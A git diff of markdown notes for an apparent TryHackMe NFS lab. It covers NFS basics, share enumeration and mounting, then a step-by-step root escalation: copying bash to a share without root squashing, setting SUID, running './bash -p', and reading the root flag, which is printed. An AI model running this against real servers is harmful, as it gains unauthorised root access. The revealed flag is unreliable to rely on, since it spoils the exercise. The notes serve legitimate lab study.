@@ -1,9 +1,6 @@
 ## NFS 
 
 
-
----
-
 ### **What is NFS?**
 
 NFS (==Network File System==) allows systems to share directories and files over a network. It enables users and programs to access files on remote systems as if they were local. NFS achieves this by mounting a portion of the file system from a server, with access controlled by assigned privileges.
@@ -97,7 +94,7 @@ sudo apt install nfs-common
     - Replace `<IP_ADDRESS>` with the IP address of the NFS server.
     - Replace `<share_name>` with the specific NFS share.
 
-#### **Explanation of Command**
+###### **Explanation of Command**
 
 - **sudo**: Run with superuser privileges.
 - **mount**: Mount command to attach the NFS share to your system.
@@ -109,7 +106,7 @@ This will allow you to interact with the NFS server's shared resources.
 
 
 
-####  Enumuration 
+### Enumuration 
 
 Based on the Nmap scan output, the NFS service is running on port 2049 (`nfs 3-4 (RPC #100003)`), but to list the available NFS shares, you need to use the `showmount` command.
 
@@ -125,7 +122,7 @@ This will display the list of NFS shares available on the server at IP `10.10.15
 
 The error message `mount.nfs: mount point /tmp/mount/ does not exist` indicates that the directory `/tmp/mount/` does not exist on your system. You need to create the directory before attempting to mount the NFS share.
 
-### Solution:
+###### Solution:
 
 1. **Create the mount point directory**: Run the following command to create the `/tmp/mount/` directory:
     
@@ -161,56 +158,7 @@ To check whether root squashing is disabled, you'll need to query the NFS server
 
 Once you have access to the NFS share, the next step is uploading an executable that will allow you to escalate privileges.
 
-1. **Obtain the Bash executable**: Use SCP to download the `bash` binary from the target machine (using the SSH key you obtained):
-    
-    ```bash
-    scp -i key_name username@10.10.150.50:/bin/bash ~/Downloads/bash
-    ```
-    
-2. **Alternatively, download a compatible `bash` from the internet**: You can also download the executable from a GitHub repository. Use `wget` to do this (ensure it's the raw file):
-    
-    ```bash
-    wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
-    ```
-    
-
-#### **Step 3: Set SUID Permissions**
-
-With root squashing potentially disabled, you can upload the bash executable and then set the SUID bit. The SUID bit makes the file execute with the permissions of the file's owner (usually root), not the user executing it.
-
-To upload the file and set SUID permissions:
-
-1. **Upload the Bash file to the NFS share**: This can be done using a command like `cp` or `mv` to transfer the file to the NFS share.
-    
-2. **Set SUID permissions**: Use `chmod` to set the SUID bit:
-    
-    ```bash
-    sudo chmod +s /path/to/bash
-    ```
-    
-
-#### **Step 4: Login Through SSH**
-
-Now that the executable has the SUID bit set, you can log into the target system via SSH.
-
-1. **SSH into the target system** using your obtained credentials:
-    
-    ```bash
-    ssh -i key_name username@10.10.150.50
-    ```
-    
-2. **Execute the Bash executable**: Run the uploaded bash executable with SUID:
-    
-    ```bash
-    /path/to/bash
-    ```
-    
-
-#### **Step 5: Gain Root Access**
-
-By executing the SUID-enabled bash executable, you will gain a shell running with root privileges, thus escalating your privileges to root.
-
-### Summary of Steps:
+###### Summary of Steps:
 
 1. NFS Access
 2. Gain low-privilege shell
@@ -221,3 +169,124 @@ By executing the SUID-enabled bash executable, you will gain a shell running wit
 
 By completing this sequence, you'll have successfully escalated privileges to root on the target machine using NFS shares and SUID binaries.
 
+
+
+###### Steps to Complete the Privilege Escalation
+
+Let's walk through the steps to escalate privileges and find the root flag.
+
+#### **1. Navigate to the NFS Mount Point**
+
+After mounting the NFS share, first navigate to the mount point where the share is accessible.
+
+```bash
+cd /tmp/mount/
+```
+
+Now, navigate to the user's home directory:
+
+```bash
+cd /home/username/
+```
+
+#### **2. Download the Bash Executable**
+
+Download the bash executable to your `Downloads` directory using `wget` or `scp` from the target machine.
+
+```bash
+scp -i key_name username@10.10.150.50:/bin/bash ~/Downloads/bash
+```
+
+#### **3. Copy the Bash Executable to the NFS Share**
+
+Once the `bash` executable is in your `Downloads` folder, copy it to the NFS share:
+
+```bash
+cp ~/Downloads/bash .
+```
+
+#### **4. Change Ownership to Root**
+
+To allow the executable to run with root privileges, change the ownership of the file to `root`:
+
+```bash
+sudo chown root bash
+```
+
+#### **5. Set the SUID Bit**
+
+Now, set the SUID bit on the bash executable. The SUID bit allows the file to be executed with the privileges of the file's owner (in this case, root). To set the SUID bit using `chmod`, you use the letter `s`:
+
+```bash
+sudo chmod +s bash
+```
+
+#### **6. Check Permissions**
+
+Verify that the permissions are set correctly using `ls -la bash`. The output should show the permissions ending with `-rwsr-xr-x`, indicating the SUID bit is set.
+
+```bash
+ls -la bash
+```
+
+Example output:
+
+```bash
+-rwsr-sr-x 1 root root 1234567 Jan 8 23:00 bash
+```
+
+#### **7. SSH into the Target Machine**
+
+Log into the target machine using SSH with the credentials you have.
+
+```bash
+ssh -i key_name username@10.10.150.50
+```
+
+#### **8. Verify Bash Executable Exists**
+
+Once logged in, confirm that the `bash` executable is present in the directory by listing the contents:
+
+```bash
+ls -la
+```
+
+Make sure the `bash` file is there.
+
+#### **9. Execute the Bash Shell with SUID**
+
+Run the bash shell with the `-p` flag to preserve the permissions:
+
+```bash
+./bash -p
+```
+
+The `-p` option ensures that the permissions are preserved and that the bash shell runs with root privileges.
+
+#### **10. Gaining Root Access**
+
+Once you've executed the command, you should now have a root shell! You can confirm root access by running:
+
+```bash
+whoami
+```
+
+You should see `root`.
+
+#### **11. Find the Root Flag**
+
+Finally, locate the root flag in the `/root` directory and display it:
+
+```bash
+cat /root/root.txt
+```
+
+The root flag should be:
+
+```
+THM{nfs_got_pwned}
+```
+
+###### Conclusion
+
+Congratulations, you've successfully used the NFS share and SUID bit to escalate privileges and obtain the root flag!
